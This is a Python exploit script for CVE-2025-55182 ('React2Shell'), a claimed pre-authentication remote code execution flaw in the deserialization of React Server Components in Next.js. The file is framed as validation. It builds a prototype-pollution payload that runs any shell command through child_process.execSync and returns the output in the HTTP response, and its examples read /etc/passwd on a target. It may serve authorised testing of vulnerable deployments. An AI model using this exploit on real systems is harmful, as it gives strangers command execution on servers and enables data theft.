#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) Exploit Validation Script
Payload format based on OffSec and Trend Micro verified PoCs.

Tests genuine pre-authentication RCE via React Server Components
Flight protocol deserialization in Next.js 16.0.6 / React 19.2.0.

Uses the NEXT_REDIRECT error technique to exfiltrate command output
directly in the HTTP response. Works from any network location.

Usage:
    python3 validate-react2shell.py [target_url] [command]

Examples:
    python3 validate-react2shell.py http://localhost:7777 id
    python3 validate-react2shell.py http://localhost:7777 "cat /etc/hostname"
    python3 validate-react2shell.py http://TARGET:7777 "cat /etc/passwd"
"""
import json
import re
import sys

try:
    import requests
except ImportError:
    print("[!] Python 'requests' library required: pip3 install requests")
    sys.exit(1)

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:7777"
COMMAND = sys.argv[2] if len(sys.argv) > 2 else "id"

print("[*] CVE-2025-55182 (React2Shell) Exploit Validation")
print("[*] Target: %s" % TARGET)
print("[*] Command: %s" % COMMAND)
print()


def escape_for_js(cmd):
    return cmd.replace("\\", "\\\\").replace("'", "\\'")


def build_payload(cmd):
    safe_cmd = escape_for_js(cmd)
    js_code = (
        "var res=process.mainModule.require('child_process')"
        ".execSync('%s',{timeout:5000}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
        % safe_cmd
    )
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": js_code,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }


def send_payload(payload):
    body = (
        '------Boundary\r\n'
        'Content-Disposition: form-data; name="0"\r\n'
        '\r\n'
        '%s\r\n'
        '------Boundary\r\n'
        'Content-Disposition: form-data; name="1"\r\n'
        '\r\n'
        '"$@0"\r\n'
        '------Boundary--'
    ) % json.dumps(payload)
    headers = {
        "Next-Action": "x",
        "Content-Type": "multipart/form-data; boundary=----Boundary",
    }
    return requests.post(TARGET, data=body.encode(), headers=headers, timeout=10)


print("[*] Sending NEXT_REDIRECT exfiltration payload...")
print()

payload = build_payload(COMMAND)

try:
    res = send_payload(payload)
    print("[*] Response status: %d" % res.status_code)

    if "digest" in res.text:
        digest_match = re.search(r'"digest":"(.*?)"', res.text)
        if digest_match:
            digest_value = digest_match.group(1)
            if digest_value.isdigit() and len(digest_value) < 15:
                print("[!] Digest is hashed (%s) -- error occurred but output was not exfiltrated." % digest_value)
                print("[!] The payload may have thrown a different error.")
                print()
                print("[*] Response body: %s" % res.text[:500])
            else:
                print("[+] SUCCESS! Command output via NEXT_REDIRECT exfiltration:")
                print("    %s" % digest_value)
                print()
                print("[+] CVE-2025-55182 RCE CONFIRMED")
        else:
            print("[!] Digest field found but could not parse value")
            print("[*] Response body: %s" % res.text[:500])
    else:
        print("[!] No digest in response")
        print("[*] Response body: %s" % res.text[:500])

except requests.exceptions.ConnectionError:
    print("[!] Connection error (reset or refused)")
    print("[!] Check that the target is reachable and Next.js is running on port 7777")
except requests.exceptions.Timeout:
    print("[!] Request timed out")
    print("[!] The server may be processing the request -- try again")
except Exception as e:
    print("[!] Error: %s" % e)

print()
print("[*] Done")
